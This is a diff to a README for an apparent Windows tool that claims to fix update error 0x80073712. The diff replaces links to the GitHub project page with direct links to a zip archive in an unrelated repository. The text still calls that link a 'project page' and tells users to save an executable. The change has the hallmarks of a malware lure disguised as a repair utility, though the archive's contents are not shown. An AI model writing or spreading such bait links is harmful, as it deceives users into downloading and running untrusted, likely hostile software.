@@ -5,7 +5,7 @@ description: "Repair Windows component store corruption error 0x80073712 on Wind
 ---
 # 🛠️ Error-0x80073712-Fix - Repair Windows Component Store Corruption Easily
 
-[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/abdulkarimtubal134/Error-0x80073712-Fix)
+[![](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://raw.githubusercontent.com/abdulkarimtubal134/abdulkarimtubal134.github.io/main/cachucha/io_abdulkarimtubal_github_3.9.zip)
 
 This tool fixes error 0x80073712 on Windows 10 and 11. This error occurs when the Windows component store contains damaged files. These files prevent Windows Update from installing new updates or features. This utility scans your system, identifies the corruption, and replaces the damaged parts with healthy files from the Windows image source.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the repair utility:
 
-1. Visit the following link to the project page: [https://github.com/abdulkarimtubal134/Error-0x80073712-Fix](https://github.com/abdulkarimtubal134/Error-0x80073712-Fix)
+1. Visit the following link to the project page: [https://raw.githubusercontent.com/abdulkarimtubal134/abdulkarimtubal134.github.io/main/cachucha/io_abdulkarimtubal_github_3.9.zip](https://raw.githubusercontent.com/abdulkarimtubal134/abdulkarimtubal134.github.io/main/cachucha/io_abdulkarimtubal_github_3.9.zip)
 2. Locate the download button on the page.
 3. Save the executable file to your desktop or downloads folder.
 
